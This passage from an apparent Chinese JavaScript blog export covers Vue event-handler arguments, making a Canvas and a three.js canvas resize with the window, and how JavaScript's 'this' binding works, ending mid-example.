<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">haha</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- undefined undefined --></span>

<span class="token comment">&lt;!-- 传了参数可以取到参数与event --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">haha</span><span class="token punctuation">(</span><span class="token string">'haha'</span><span class="token punctuation">,</span> event<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- haha event --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>vue中的事件与使用html属性监听事件相同，若声明了event形参，则应该传入$event实参，否则报undefined。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>事件回调参数</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript之Canvas自适应</title>
    <url>/2019/06/14/javascript%E4%B9%8BCanvas%E8%87%AA%E9%80%82%E5%BA%94/</url>
    <content><![CDATA[<h2 id="Canvas自适应的问题"><a href="#Canvas自适应的问题" class="headerlink" title="Canvas自适应的问题"></a>Canvas自适应的问题</h2><p>在使用Canvas的过程中，我们遇到的第一个问题就是屏幕自适应的问题，与普通的html标签不同，Canvas标签虽然支持长宽百分比的写法，但是内部绘制的图像并不适应百分比的缩放，我们会发现图像是糊的根本无法查看。好在浏览器的api中有一个resize事件，那么我们就利用resize事件来重新改变Canvas标签的长宽，来达到自适应的效果。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 这里要注意的一点是使用了flex，因为没有flex属性时，canvas超出了container，产生了滚动条 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">heigth</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>canvas<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<span id="more"></span>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> container <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> canvas <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"canvas"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 设置canvas宽、高</span>
canvas<span class="token punctuation">.</span>width <span class="token operator">=</span> container<span class="token punctuation">.</span>clientWidth<span class="token punctuation">;</span>
canvas<span class="token punctuation">.</span>height <span class="token operator">=</span> container<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>
<span class="token keyword">const</span> ctx <span class="token operator">=</span> canvas<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 绘制函数</span>
<span class="token keyword">const</span> <span class="token function-variable function">draw</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>clientWidth<span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>clientHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
  ctx<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">"pink"</span><span class="token punctuation">;</span>
  ctx<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>clientWidth<span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>clientHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 窗口大小改变时执行的函数</span>
<span class="token keyword">const</span> <span class="token function-variable function">onResize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  canvas<span class="token punctuation">.</span>width <span class="token operator">=</span> container<span class="token punctuation">.</span>clientWidth<span class="token punctuation">;</span>
  canvas<span class="token punctuation">.</span>height <span class="token operator">=</span> container<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>
  <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">// 为窗口大小改变事件增加监听器</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span> onResize<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="three-js中的canvas自适应"><a href="#three-js中的canvas自适应" class="headerlink" title="three.js中的canvas自适应"></a>three.js中的canvas自适应</h2><p>在three.js中canvas的自适应又有所不同。我们先按照前面的思路来实现three.js下的自适应。前置环境：npm安装three.js。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>three<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> <span class="token constant">THREE</span> <span class="token keyword">from</span> <span class="token string">"three"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> threeContainer <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">THREE<span class="token punctuation">.</span>Scene</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> camera <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">THREE<span class="token punctuation">.</span>PerspectiveCamera</span><span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">,</span> threeContainer<span class="token punctuation">.</span>clientWidth <span class="token operator">/</span> threeContainer<span class="token punctuation">.</span>clientHeight<span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> renderer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">THREE<span class="token punctuation">.</span>WebGLRenderer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

renderer<span class="token punctuation">.</span><span class="token function">setSize</span><span class="token punctuation">(</span>threeContainer<span class="token punctuation">.</span>clientWidth<span class="token punctuation">,</span> threeContainer<span class="token punctuation">.</span>clientHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
threeContainer<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>renderer<span class="token punctuation">.</span>domElement<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">onResize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 相机参数：宽高比</span>
  camera<span class="token punctuation">.</span>aspect <span class="token operator">=</span> threeContainer<span class="token punctuation">.</span>clientWidth <span class="token operator">/</span> threeContainer<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>
  <span class="token comment">// 更新投影矩阵</span>
  camera<span class="token punctuation">.</span><span class="token function">updateProjectionMatrix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 设置canvas宽高</span>
  renderer<span class="token punctuation">.</span><span class="token function">setSize</span><span class="token punctuation">(</span>threeContainer<span class="token punctuation">.</span>clientWidth<span class="token punctuation">,</span> threeContainer<span class="token punctuation">.</span>clientHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span> onResize<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用之前canvas同样思路的方法，我们发现确实可以做到自适应了，但是窗口放大时没有问题，窗口缩小的时候右侧与底边会出现两条空白，这是为什么呢？</p>
<p>原来窗口缩小时，canvas区域大于窗口变化后的threeContainer区域，threeContainer区域出现了滚动条，这时读取到的threeContainer区域的clientWidth与clientHeight是不包含滚动条大小的。用此时读取到的threeContainer区域大小去设置three.js的canvas绘制区域，使canvas区域变小，threeContainer区域滚动条消失，最后就出现了两条空白。</p>
<p>解决方法非常简单，在threeContainer上增加一个css样式overflow:hidden即可，这样就不会有滚动条影响canvas区域的大小了。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>Canvas</tag>
        <tag>resize</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript关键字this</title>
    <url>/2018/03/15/javascript%E5%85%B3%E9%94%AE%E5%AD%97this/</url>
    <content><![CDATA[<h1 id="this的四种绑定（动态作用域，动态绑定，绑定调用时的对象）"><a href="#this的四种绑定（动态作用域，动态绑定，绑定调用时的对象）" class="headerlink" title="this的四种绑定（动态作用域，动态绑定，绑定调用时的对象）"></a>this的四种绑定（动态作用域，动态绑定，绑定调用时的对象）</h1><h2 id="一、this的默认绑定"><a href="#一、this的默认绑定" class="headerlink" title="一、this的默认绑定"></a>一、this的默认绑定</h2><h3 id="全局上下文中（即在任何函数体外部）"><a href="#全局上下文中（即在任何函数体外部）" class="headerlink" title="全局上下文中（即在任何函数体外部）"></a>全局上下文中（即在任何函数体外部）</h3><p>无论是否为严格模式，this均绑定到全局对象（node中为global，浏览器中是window）。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">"use strict"</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="在函数上下文中"><a href="#在函数上下文中" class="headerlink" title="在函数上下文中"></a>在函数上下文中</h3><h4 id="1-严格模式下，this默认绑定为undefined"><a href="#1-严格模式下，this默认绑定为undefined" class="headerlink" title="(1)严格模式下，this默认绑定为undefined"></a>(1)严格模式下，this默认绑定为undefined</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"use strict"</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="2-非严格模式下，this默认绑定到全局（node中是global，浏览器中是window）有以下四种情况："><a href="#2-非严格模式下，this默认绑定到全局（node中是global，浏览器中是window）有以下四种情况：" class="headerlink" title="(2)非严格模式下，this默认绑定到全局（node中是global，浏览器中是window）有以下四种情况："></a>(2)非严格模式下，this默认绑定到全局（node中是global，浏览器中是window）有以下四种情况：</h4><span id="more"></span>
<h5 id="1-函数独立调用"><a href="#1-函数独立调用" class="headerlink" title="1.函数独立调用"></a>1.函数独立调用</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="2-被嵌套的函数独立调用"><a href="#2-被嵌套的函数独立调用" class="headerlink" title="2.被嵌套的函数独立调用"></a>2.被嵌套的函数独立调用</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//ES6中对象的语法糖，原写法为 foo: function () &#123;...</span>
        <span class="token keyword">function</span> <span class="token function">bar</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="3-IIFE立即执行函数"><a href="#3-IIFE立即执行函数" class="headerlink" title="3.IIFE立即执行函数"></a>3.IIFE立即执行函数</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="4-闭包"><a href="#4-闭包" class="headerlink" title="4.闭包"></a>4.闭包</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> bar<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true    obj.foo()相当于bar，obj.foo()()相当于bar();</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由于闭包使this绑定到全局，而我们常常要访问上层嵌套函数的this，通常我们在上层嵌套函数中把this赋值给that，在闭包中使用that即可访问到嵌套函数中的this。（也可以用ES6的箭头函数来实现，见后文）</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> that <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>that <span class="token operator">===</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> bar<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用箭头函数实现</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> <span class="token function-variable function">bar</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bar<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二、this的隐式绑定与丢失"><a href="#二、this的隐式绑定与丢失" class="headerlink" title="二、this的隐式绑定与丢失"></a>二、this的隐式绑定与丢失</h2><h3 id="隐式绑定"><a href="#隐式绑定" class="headerlink" title="隐式绑定"></a>隐式绑定</h3><p>被直接对象所包含的函数调用时，即函数的方法调用，this隐式绑定到该直接对象。在多重对象中，this绑定到最近一层的对象。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj1"</span><span class="token punctuation">,</span>
    foo<span class="token operator">:</span> foo<span class="token punctuation">,</span>
    obj2<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        objName<span class="token operator">:</span> <span class="token string">"obj2"</span><span class="token punctuation">,</span>
        foo<span class="token operator">:</span> foo<span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj1<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj 1</span>
obj1<span class="token punctuation">.</span>obj2<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="隐式丢失"><a href="#隐式丢失" class="headerlink" title="隐式丢失"></a>隐式丢失</h3><p>this的隐式丢失是指：被隐式绑定的函数丢失绑定的对象，从而默认绑定到全局对象（window或global）。<br>this的隐式绑定由对象的方法函数是如何被调用决定，而不是由函数定义在哪个对象决定。故会出现this的隐式丢失。<br>this的隐式丢失的基本原理都是间接引用了对象的方法函数，对象只是作为函数引用的桥梁，函数并没有通过对象调用。（更底层的解释是对象和对象的方法函数存储在不同的内存位置，只有通过对象的内存调用对象方法函数的内存时，才能实现隐式绑定，间接引用时相当于只调用了对象方法函数的内存，故造成了隐式丢失，this默认绑定到了全局。）</p>
<p>隐式丢失的四种情况：</p>
<h4 id="1-对象的方法函数赋值给其他变量、常量-相当于默认绑定中的独立调用"><a href="#1-对象的方法函数赋值给其他变量、常量-相当于默认绑定中的独立调用" class="headerlink" title="1.对象的方法函数赋值给其他变量、常量(相当于默认绑定中的独立调用)"></a>1.对象的方法函数赋值给其他变量、常量(相当于默认绑定中的独立调用)</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
    foo<span class="token operator">:</span> foo<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bar <span class="token operator">=</span> obj<span class="token punctuation">.</span>foo<span class="token punctuation">;</span>
<span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>网上很多例子中喜欢在全局中var objName = “window”，使this绑定到全局时this.objName显示为”window”。但是在ES6中，使用let或const objName = “window”，this绑定到全局时this.objName为undefined。这是因为var声明的全局变量会自动挂载到顶层对象window中，除了可以直接访问，还可以通过window属性访问，而let与const声明的变量只能通过变量名直接访问。</p>
<h4 id="2-对象的方法函数赋值给其他对象后立即执行（相当于默认绑定中的IIFE）"><a href="#2-对象的方法函数赋值给其他对象后立即执行（相当于默认绑定中的IIFE）" class="headerlink" title="2.对象的方法函数赋值给其他对象后立即执行（相当于默认绑定中的IIFE）"></a>2.对象的方法函数赋值给其他对象后立即执行（相当于默认绑定中的IIFE）</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj1"</span><span class="token punctuation">,</span>
    foo<span class="token operator">:</span> foo<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> obj2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj2"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>foo <span class="token operator">=</span> obj1<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this.objName为undefined，因为this指向全局对象window，其中没有objName属性</span>
obj2<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="3-对象的方法函数经过赋值或运算后再执行（相当于默认绑定中的独立调用）"><a href="#3-对象的方法函数经过赋值或运算后再执行（相当于默认绑定中的独立调用）" class="headerlink" title="3.对象的方法函数经过赋值或运算后再执行（相当于默认绑定中的独立调用）"></a>3.对象的方法函数经过赋值或运算后再执行（相当于默认绑定中的独立调用）</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
    foo<span class="token operator">:</span> foo<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>obj<span class="token punctuation">.</span>foo <span class="token operator">=</span> obj<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this.objName为undefined</span>
